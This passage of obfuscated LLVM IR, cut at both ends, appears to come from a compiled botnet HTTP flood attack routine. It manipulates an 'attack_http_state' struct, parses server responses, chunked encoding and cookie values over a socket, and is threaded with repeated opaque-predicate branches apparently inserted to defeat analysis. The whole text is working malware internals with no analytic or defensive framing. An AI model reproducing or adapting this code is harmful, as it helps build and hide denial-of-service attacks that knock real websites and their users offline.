  %3862 = sub nsw i32 %3860, %3861
  %3863 = call i32 @util_memsearch(i8* %3857, i32 %3862, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3863, i32* %69, align 4
  %3864 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3864, i32 0, i32 18
  %3866 = load i32, i32* %68, align 4
  %3867 = load i32, i32* %69, align 4
  %3868 = sub nsw i32 %3867, 1
  %3869 = add nsw i32 %3866, %3868
  %3870 = sext i32 %3869 to i64
  %3871 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3865, i64 0, i64 %3870
  store i8 0, i8* %3871, align 1
  %3872 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3873 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3872, i32 0, i32 15
  %3874 = load i32, i32* %3873, align 4
  %3875 = icmp slt i32 %3874, 5
  %3876 = load i32, i32* @x.19
  %3877 = load i32, i32* @y.20
  %3878 = sub i32 %3876, 1
  %3879 = mul i32 %3876, %3878
  %3880 = urem i32 %3879, 2
  %3881 = icmp eq i32 %3880, 0
  %3882 = icmp slt i32 %3877, 10
  %3883 = or i1 %3881, %3882
  br i1 %3883, label %originalBBpart2732, label %originalBB712alteredBB

originalBBpart2732:                               ; preds = %originalBB712
  br i1 %3875, label %3884, label %3979

; <label>:3884:                                   ; preds = %originalBBpart2732
  %3885 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3885, i32 0, i32 18
  %3887 = load i32, i32* %68, align 4
  %3888 = sext i32 %3887 to i64
  %3889 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3886, i64 0, i64 %3888
  %3890 = call i32 @util_strlen(i8* %3889)
  %3891 = icmp slt i32 %3890, 128
  br i1 %3891, label %3892, label %3979

; <label>:3892:                                   ; preds = %3884
  %3893 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3894 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3893, i32 0, i32 16
  %3895 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3896 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3895, i32 0, i32 15
  %3897 = load i32, i32* %3896, align 4
  %3898 = sext i32 %3897 to i64
  %3899 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3894, i64 0, i64 %3898
  %3900 = getelementptr inbounds [128 x i8], [128 x i8]* %3899, i32 0, i32 0
  %3901 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3901, i32 0, i32 18
  %3903 = load i32, i32* %68, align 4
  %3904 = sext i32 %3903 to i64
  %3905 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3902, i64 0, i64 %3904
  %3906 = call i32 @util_strcpy(i8* %3900, i8* %3905)
  %3907 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3908 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3907, i32 0, i32 16
  %3909 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3910 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3909, i32 0, i32 15
  %3911 = load i32, i32* %3910, align 4
  %3912 = sext i32 %3911 to i64
  %3913 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3908, i64 0, i64 %3912
  %3914 = getelementptr inbounds [128 x i8], [128 x i8]* %3913, i32 0, i32 0
  %3915 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3916 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3915, i32 0, i32 16
  %3917 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3918 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3917, i32 0, i32 15
  %3919 = load i32, i32* %3918, align 4
  %3920 = sext i32 %3919 to i64
  %3921 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3916, i64 0, i64 %3920
  %3922 = getelementptr inbounds [128 x i8], [128 x i8]* %3921, i32 0, i32 0
  %3923 = call i32 @util_strlen(i8* %3922)
  %3924 = sext i32 %3923 to i64
  %3925 = getelementptr inbounds i8, i8* %3914, i64 %3924
  %3926 = call i32 @util_strcpy(i8* %3925, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %3927 = load i32, i32* %69, align 4
  %3928 = add nsw i32 %3927, 3
  %3929 = load i32, i32* %68, align 4
  %3930 = add nsw i32 %3929, %3928
  store i32 %3930, i32* %68, align 4
  %3931 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3931, i32 0, i32 18
  %3933 = load i32, i32* %68, align 4
  %3934 = sext i32 %3933 to i64
  %3935 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3932, i64 0, i64 %3934
  %3936 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3937 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3936, i32 0, i32 17
  %3938 = load i32, i32* %3937, align 4
  %3939 = load i32, i32* %68, align 4
  %3940 = sub nsw i32 %3938, %3939
  %3941 = call i32 @util_memsearch(i8* %3935, i32 %3940, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3941, i32* %69, align 4
  %3942 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3943 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3942, i32 0, i32 18
  %3944 = load i32, i32* %68, align 4
  %3945 = load i32, i32* %69, align 4
  %3946 = sub nsw i32 %3945, 1
  %3947 = add nsw i32 %3944, %3946
  %3948 = sext i32 %3947 to i64
  %3949 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3943, i64 0, i64 %3948
  store i8 0, i8* %3949, align 1
  %3950 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3951 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3950, i32 0, i32 16
  %3952 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3953 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3952, i32 0, i32 15
  %3954 = load i32, i32* %3953, align 4
  %3955 = sext i32 %3954 to i64
  %3956 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3951, i64 0, i64 %3955
  %3957 = getelementptr inbounds [128 x i8], [128 x i8]* %3956, i32 0, i32 0
  %3958 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3959 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3958, i32 0, i32 16
  %3960 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3961 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3960, i32 0, i32 15
  %3962 = load i32, i32* %3961, align 4
  %3963 = sext i32 %3962 to i64
  %3964 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3959, i64 0, i64 %3963
  %3965 = getelementptr inbounds [128 x i8], [128 x i8]* %3964, i32 0, i32 0
  %3966 = call i32 @util_strlen(i8* %3965)
  %3967 = sext i32 %3966 to i64
  %3968 = getelementptr inbounds i8, i8* %3957, i64 %3967
  %3969 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3969, i32 0, i32 18
  %3971 = load i32, i32* %68, align 4
  %3972 = sext i32 %3971 to i64
  %3973 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3970, i64 0, i64 %3972
  %3974 = call i32 @util_strcpy(i8* %3968, i8* %3973)
  %3975 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3975, i32 0, i32 15
  %3977 = load i32, i32* %3976, align 4
  %3978 = add nsw i32 %3977, 1
  store i32 %3978, i32* %3976, align 4
  br label %3979

; <label>:3979:                                   ; preds = %3892, %3884, %originalBBpart2732
  %3980 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3981 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3980, i32 0, i32 14
  store i32 -1, i32* %3981, align 4
  %3982 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3982, i32 0, i32 1
  store i8 10, i8* %3983, align 4
  br label %4138

; <label>:3984:                                   ; preds = %3826
  br label %3985

; <label>:3985:                                   ; preds = %3984, %originalBBpart2710
  br label %3986

; <label>:3986:                                   ; preds = %3985, %3762
  %3987 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3988 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3987, i32 0, i32 14
  %3989 = load i32, i32* %3988, align 4
  %3990 = icmp eq i32 %3989, 0
  br i1 %3990, label %3991, label %4069

; <label>:3991:                                   ; preds = %3986
  %3992 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3992, i32 0, i32 13
  %3994 = load i32, i32* %3993, align 4
  %3995 = icmp eq i32 %3994, 1
  br i1 %3995, label %3996, label %4052

; <label>:3996:                                   ; preds = %3991
  %3997 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3998 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3997, i32 0, i32 18
  %3999 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3998, i32 0, i32 0
  %4000 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4000, i32 0, i32 17
  %4002 = load i32, i32* %4001, align 4
  %4003 = call i32 @util_memsearch(i8* %3999, i32 %4002, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %4004 = icmp ne i32 %4003, -1
  br i1 %4004, label %4005, label %4051

; <label>:4005:                                   ; preds = %3996
  %4006 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4007 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4006, i32 0, i32 18
  %4008 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4007, i32 0, i32 0
  %4009 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4010 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4009, i32 0, i32 17
  %4011 = load i32, i32* %4010, align 4
  %4012 = call i32 @util_memsearch(i8* %4008, i32 %4011, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4012, i32* %70, align 4
  %4013 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4014 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4013, i32 0, i32 18
  %4015 = load i32, i32* %70, align 4
  %4016 = sub nsw i32 %4015, 2
  %4017 = sext i32 %4016 to i64
  %4018 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4014, i64 0, i64 %4017
  store i8 0, i8* %4018, align 1
  %4019 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4020 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4019, i32 0, i32 18
  %4021 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4020, i32 0, i32 0
  %4022 = load i32, i32* %70, align 4
  %4023 = call i32 @util_memsearch(i8* %4021, i32 %4022, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4024 = icmp ne i32 %4023, -1
  br i1 %4024, label %4025, label %4035

; <label>:4025:                                   ; preds = %4005
  %4026 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4027 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4026, i32 0, i32 18
  %4028 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4029 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4028, i32 0, i32 18
  %4030 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4029, i32 0, i32 0
  %4031 = load i32, i32* %70, align 4
  %4032 = call i32 @util_memsearch(i8* %4030, i32 %4031, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4033 = sext i32 %4032 to i64
  %4034 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4027, i64 0, i64 %4033
  store i8 0, i8* %4034, align 1
  br label %4035

; <label>:4035:                                   ; preds = %4025, %4005
  %4036 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4037 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4036, i32 0, i32 18
  %4038 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4037, i32 0, i32 0
  %4039 = call i32 @util_atoi(i8* %4038, i32 16)
  store i32 %4039, i32* %71, align 4
  %4040 = load i32, i32* %71, align 4
  %4041 = icmp eq i32 %4040, 0
  br i1 %4041, label %4042, label %4045

; <label>:4042:                                   ; preds = %4035
  %4043 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4044 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4043, i32 0, i32 1
  store i8 1, i8* %4044, align 4
  br label %4138

; <label>:4045:                                   ; preds = %4035
  %4046 = load i32, i32* %71, align 4
  %4047 = add nsw i32 %4046, 2
  %4048 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4049 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4048, i32 0, i32 14
  store i32 %4047, i32* %4049, align 4
  %4050 = load i32, i32* %70, align 4
  store i32 %4050, i32* %67, align 4
  br label %4051

; <label>:4051:                                   ; preds = %4045, %3996
  br label %4068

; <label>:4052:                                   ; preds = %3991
  %4053 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4054 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4053, i32 0, i32 17
  %4055 = load i32, i32* %4054, align 4
  %4056 = load i32, i32* %67, align 4
  %4057 = sub nsw i32 %4055, %4056
  %4058 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4059 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4058, i32 0, i32 14
  store i32 %4057, i32* %4059, align 4
  %4060 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4061 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4060, i32 0, i32 14
  %4062 = load i32, i32* %4061, align 4
  %4063 = icmp eq i32 %4062, 0
  br i1 %4063, label %4064, label %4067

; <label>:4064:                                   ; preds = %4052
  %4065 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4066 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4065, i32 0, i32 1
  store i8 1, i8* %4066, align 4
  br label %4138

; <label>:4067:                                   ; preds = %4052
  br label %4068

; <label>:4068:                                   ; preds = %4067, %4051
  br label %4069

; <label>:4069:                                   ; preds = %4068, %3986
  %4070 = load i32, i32* %67, align 4
  %4071 = icmp eq i32 %4070, 0
  br i1 %4071, label %4072, label %4089

; <label>:4072:                                   ; preds = %4069
  %4073 = load i32, i32* @x.19
  %4074 = load i32, i32* @y.20
  %4075 = sub i32 %4073, 1
  %4076 = mul i32 %4073, %4075
  %4077 = urem i32 %4076, 2
  %4078 = icmp eq i32 %4077, 0
  %4079 = icmp slt i32 %4074, 10
  %4080 = or i1 %4078, %4079
  br i1 %4080, label %originalBB734, label %originalBB734alteredBB

originalBB734:                                    ; preds = %originalBB734alteredBB, %4072
  %4081 = load i32, i32* @x.19
  %4082 = load i32, i32* @y.20
  %4083 = sub i32 %4081, 1
  %4084 = mul i32 %4081, %4083
  %4085 = urem i32 %4084, 2
  %4086 = icmp eq i32 %4085, 0
  %4087 = icmp slt i32 %4082, 10
  %4088 = or i1 %4086, %4087
  br i1 %4088, label %originalBBpart2736, label %originalBB734alteredBB

originalBBpart2736:                               ; preds = %originalBB734
  br label %4138

; <label>:4089:                                   ; preds = %4069
  %4090 = load i32, i32* @x.19
  %4091 = load i32, i32* @y.20
  %4092 = sub i32 %4090, 1
  %4093 = mul i32 %4090, %4092
  %4094 = urem i32 %4093, 2
  %4095 = icmp eq i32 %4094, 0
  %4096 = icmp slt i32 %4091, 10
  %4097 = or i1 %4095, %4096
  br i1 %4097, label %originalBB738, label %originalBB738alteredBB

originalBB738:                                    ; preds = %originalBB738alteredBB, %4089
  %4098 = load i32, i32* %67, align 4
  %4099 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4100 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4099, i32 0, i32 17
  %4101 = load i32, i32* %4100, align 4
  %4102 = sub nsw i32 %4101, %4098
  store i32 %4102, i32* %4100, align 4
  %4103 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4104 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4103, i32 0, i32 18
  %4105 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4104, i32 0, i32 0
  %4106 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4106, i32 0, i32 18
  %4108 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4107, i32 0, i32 0
  %4109 = load i32, i32* %67, align 4
  %4110 = sext i32 %4109 to i64
  %4111 = getelementptr inbounds i8, i8* %4108, i64 %4110
  %4112 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4113 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4112, i32 0, i32 17
  %4114 = load i32, i32* %4113, align 4
  %4115 = sext i32 %4114 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4105, i8* %4111, i64 %4115, i32 1, i1 false)
  %4116 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4116, i32 0, i32 18
  %4118 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4118, i32 0, i32 17
  %4120 = load i32, i32* %4119, align 4
  %4121 = sext i32 %4120 to i64
  %4122 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4117, i64 0, i64 %4121
  store i8 0, i8* %4122, align 1
  %4123 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4124 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4123, i32 0, i32 17
  %4125 = load i32, i32* %4124, align 4
  %4126 = icmp eq i32 %4125, 0
  %4127 = load i32, i32* @x.19
  %4128 = load i32, i32* @y.20
  %4129 = sub i32 %4127, 1
  %4130 = mul i32 %4127, %4129
  %4131 = urem i32 %4130, 2
  %4132 = icmp eq i32 %4131, 0
  %4133 = icmp slt i32 %4128, 10
  %4134 = or i1 %4132, %4133
  br i1 %4134, label %originalBBpart2743, label %originalBB738alteredBB

originalBBpart2743:                               ; preds = %originalBB738
  br i1 %4126, label %4135, label %4136

; <label>:4135:                                   ; preds = %originalBBpart2743
  br label %4138

; <label>:4136:                                   ; preds = %originalBBpart2743
  br label %4137

; <label>:4137:                                   ; preds = %4136
  br label %3762

; <label>:4138:                                   ; preds = %4135, %originalBBpart2736, %4064, %4042, %3979
  br label %3588

; <label>:4139:                                   ; preds = %originalBBpart2692, %3610
  br label %4256

; <label>:4140:                                   ; preds = %3565
  %4141 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4141, i32 0, i32 1
  %4143 = load i8, i8* %4142, align 4
  %4144 = zext i8 %4143 to i32
  %4145 = icmp eq i32 %4144, 10
  br i1 %4145, label %4146, label %4239

; <label>:4146:                                   ; preds = %4140
  %4147 = load i32, i32* @x.19
  %4148 = load i32, i32* @y.20
  %4149 = sub i32 %4147, 1
  %4150 = mul i32 %4147, %4149
  %4151 = urem i32 %4150, 2
  %4152 = icmp eq i32 %4151, 0
  %4153 = icmp slt i32 %4148, 10
  %4154 = or i1 %4152, %4153
  br i1 %4154, label %originalBB745, label %originalBB745alteredBB

originalBB745:                                    ; preds = %originalBB745alteredBB, %4146
  %4155 = load i32, i32* @x.19
  %4156 = load i32, i32* @y.20
  %4157 = sub i32 %4155, 1
  %4158 = mul i32 %4155, %4157
  %4159 = urem i32 %4158, 2
  %4160 = icmp eq i32 %4159, 0
  %4161 = icmp slt i32 %4156, 10
  %4162 = or i1 %4160, %4161
  br i1 %4162, label %originalBBpart2747, label %originalBB745alteredBB

originalBBpart2747:                               ; preds = %originalBB745
  br label %4163

; <label>:4163:                                   ; preds = %4212, %originalBBpart2747
  %4164 = load i32, i32* @x.19
  %4165 = load i32, i32* @y.20
  %4166 = sub i32 %4164, 1
  %4167 = mul i32 %4164, %4166
  %4168 = urem i32 %4167, 2
  %4169 = icmp eq i32 %4168, 0
  %4170 = icmp slt i32 %4165, 10
  %4171 = or i1 %4169, %4170
  br i1 %4171, label %originalBB749, label %originalBB749alteredBB

originalBB749:                                    ; preds = %originalBB749alteredBB, %4163
  %4172 = call i32* @__errno_location() #7
  store i32 0, i32* %4172, align 4
  %4173 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4174 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4173, i32 0, i32 0
  %4175 = load i32, i32* %4174, align 4
  %4176 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4177 = call i64 @recv(i32 %4175, i8* %4176, i64 10240, i32 16384)
  %4178 = trunc i64 %4177 to i32
  store i32 %4178, i32* %20, align 4
  %4179 = load i32, i32* %20, align 4
  %4180 = icmp eq i32 %4179, 0
  %4181 = load i32, i32* @x.19
  %4182 = load i32, i32* @y.20
  %4183 = sub i32 %4181, 1
  %4184 = mul i32 %4181, %4183
  %4185 = urem i32 %4184, 2
  %4186 = icmp eq i32 %4185, 0
  %4187 = icmp slt i32 %4182, 10
  %4188 = or i1 %4186, %4187
  br i1 %4188, label %originalBBpart2751, label %originalBB749alteredBB

originalBBpart2751:                               ; preds = %originalBB749
  br i1 %4180, label %4189, label %4191

; <label>:4189:                                   ; preds = %originalBBpart2751
  %4190 = call i32* @__errno_location() #7
  store i32 104, i32* %4190, align 4
  store i32 -1, i32* %20, align 4
  br label %4191

; <label>:4191:                                   ; preds = %4189, %originalBBpart2751
  %4192 = load i32, i32* %20, align 4
  %4193 = icmp eq i32 %4192, -1
  br i1 %4193, label %4194, label %4212

; <label>:4194:                                   ; preds = %4191
  %4195 = call i32* @__errno_location() #7
  %4196 = load i32, i32* %4195, align 4
  %4197 = icmp ne i32 %4196, 11
  br i1 %4197, label %4198, label %4211

; <label>:4198:                                   ; preds = %4194
  %4199 = call i32* @__errno_location() #7
  %4200 = load i32, i32* %4199, align 4
  %4201 = icmp ne i32 %4200, 11
  br i1 %4201, label %4202, label %4211

; <label>:4202:                                   ; preds = %4198
  %4203 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4203, i32 0, i32 0
  %4205 = load i32, i32* %4204, align 4
  %4206 = call i32 @close(i32 %4205)
  %4207 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4208 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4207, i32 0, i32 0
  store i32 -1, i32* %4208, align 4
  %4209 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4209, i32 0, i32 1
  store i8 0, i8* %4210, align 4
  br label %4211

; <label>:4211:                                   ; preds = %4202, %4198, %4194
  br label %4213

; <label>:4212:                                   ; preds = %4191
  br label %4163

; <label>:4213:                                   ; preds = %4211
  %4214 = load i32, i32* @x.19
  %4215 = load i32, i32* @y.20
  %4216 = sub i32 %4214, 1
  %4217 = mul i32 %4214, %4216
  %4218 = urem i32 %4217, 2
  %4219 = icmp eq i32 %4218, 0
  %4220 = icmp slt i32 %4215, 10
  %4221 = or i1 %4219, %4220
  br i1 %4221, label %originalBB753, label %originalBB753alteredBB

originalBB753:                                    ; preds = %originalBB753alteredBB, %4213
  %4222 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4222, i32 0, i32 1
  %4224 = load i8, i8* %4223, align 4
  %4225 = zext i8 %4224 to i32
  %4226 = icmp ne i32 %4225, 0
  %4227 = load i32, i32* @x.19
  %4228 = load i32, i32* @y.20
  %4229 = sub i32 %4227, 1
  %4230 = mul i32 %4227, %4229
  %4231 = urem i32 %4230, 2
  %4232 = icmp eq i32 %4231, 0
  %4233 = icmp slt i32 %4228, 10
  %4234 = or i1 %4232, %4233
  br i1 %4234, label %originalBBpart2755, label %originalBB753alteredBB

originalBBpart2755:                               ; preds = %originalBB753
  br i1 %4226, label %4235, label %4238

; <label>:4235:                                   ; preds = %originalBBpart2755
  %4236 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4236, i32 0, i32 1
  store i8 1, i8* %4237, align 4
  br label %4238

; <label>:4238:                                   ; preds = %4235, %originalBBpart2755
  br label %4239

; <label>:4239:                                   ; preds = %4238, %4140
  %4240 = load i32, i32* @x.19
  %4241 = load i32, i32* @y.20
  %4242 = sub i32 %4240, 1
  %4243 = mul i32 %4240, %4242
  %4244 = urem i32 %4243, 2
  %4245 = icmp eq i32 %4244, 0
  %4246 = icmp slt i32 %4241, 10
  %4247 = or i1 %4245, %4246
  br i1 %4247, label %originalBB757, label %originalBB757alteredBB

originalBB757:                                    ; preds = %originalBB757alteredBB, %4239
  %4248 = load i32, i32* @x.19
  %4249 = load i32, i32* @y.20
  %4250 = sub i32 %4248, 1
  %4251 = mul i32 %4248, %4250
  %4252 = urem i32 %4251, 2
  %4253 = icmp eq i32 %4252, 0
  %4254 = icmp slt i32 %4249, 10
  %4255 = or i1 %4253, %4254
  br i1 %4255, label %originalBBpart2759, label %originalBB757alteredBB

originalBBpart2759:                               ; preds = %originalBB757
  br label %4256

; <label>:4256:                                   ; preds = %originalBBpart2759, %4139
  %4257 = load i32, i32* @x.19
  %4258 = load i32, i32* @y.20
  %4259 = sub i32 %4257, 1
  %4260 = mul i32 %4257, %4259
  %4261 = urem i32 %4260, 2
  %4262 = icmp eq i32 %4261, 0
  %4263 = icmp slt i32 %4258, 10
  %4264 = or i1 %4262, %4263
  br i1 %4264, label %originalBB761, label %originalBB761alteredBB

originalBB761:                                    ; preds = %originalBB761alteredBB, %4256
  %4265 = load i32, i32* @x.19
  %4266 = load i32, i32* @y.20
  %4267 = sub i32 %4265, 1
  %4268 = mul i32 %4265, %4267
  %4269 = urem i32 %4268, 2
  %4270 = icmp eq i32 %4269, 0
  %4271 = icmp slt i32 %4266, 10
  %4272 = or i1 %4270, %4271
  br i1 %4272, label %originalBBpart2763, label %originalBB761alteredBB

originalBBpart2763:                               ; preds = %originalBB761
  br label %4273

; <label>:4273:                                   ; preds = %originalBBpart2763, %3556
  br label %4274

; <label>:4274:                                   ; preds = %4273, %originalBBpart2255
  %4275 = load i32, i32* @x.19
  %4276 = load i32, i32* @y.20
  %4277 = sub i32 %4275, 1
  %4278 = mul i32 %4275, %4277
  %4279 = urem i32 %4278, 2
  %4280 = icmp eq i32 %4279, 0
  %4281 = icmp slt i32 %4276, 10
  %4282 = or i1 %4280, %4281
  br i1 %4282, label %originalBB765, label %originalBB765alteredBB

originalBB765:                                    ; preds = %originalBB765alteredBB, %4274
  %4283 = load i32, i32* @x.19
  %4284 = load i32, i32* @y.20
  %4285 = sub i32 %4283, 1
  %4286 = mul i32 %4283, %4285
  %4287 = urem i32 %4286, 2
  %4288 = icmp eq i32 %4287, 0
  %4289 = icmp slt i32 %4284, 10
  %4290 = or i1 %4288, %4289
  br i1 %4290, label %originalBBpart2767, label %originalBB765alteredBB

originalBBpart2767:                               ; preds = %originalBB765
  br label %4291

; <label>:4291:                                   ; preds = %originalBBpart2767, %3436, %2865, %originalBBpart2263, %1795, %originalBBpart2223, %1625
  %4292 = load i32, i32* %17, align 4
  %4293 = add nsw i32 %4292, 1
  store i32 %4293, i32* %17, align 4
  br label %1596

; <label>:4294:                                   ; preds = %originalBBpart2211
  br label %600

; <label>:4295:                                   ; preds = %136, %originalBBpart24, %110, %105
  %4296 = load i32, i32* @x.19
  %4297 = load i32, i32* @y.20
  %4298 = sub i32 %4296, 1
  %4299 = mul i32 %4296, %4298
  %4300 = urem i32 %4299, 2
  %4301 = icmp eq i32 %4300, 0
  %4302 = icmp slt i32 %4297, 10
  %4303 = or i1 %4301, %4302
  br i1 %4303, label %originalBB769, label %originalBB769alteredBB

originalBB769:                                    ; preds = %originalBB769alteredBB, %4295
  %4304 = load i32, i32* @x.19
  %4305 = load i32, i32* @y.20
  %4306 = sub i32 %4304, 1
  %4307 = mul i32 %4304, %4306
  %4308 = urem i32 %4307, 2
  %4309 = icmp eq i32 %4308, 0
  %4310 = icmp slt i32 %4305, 10
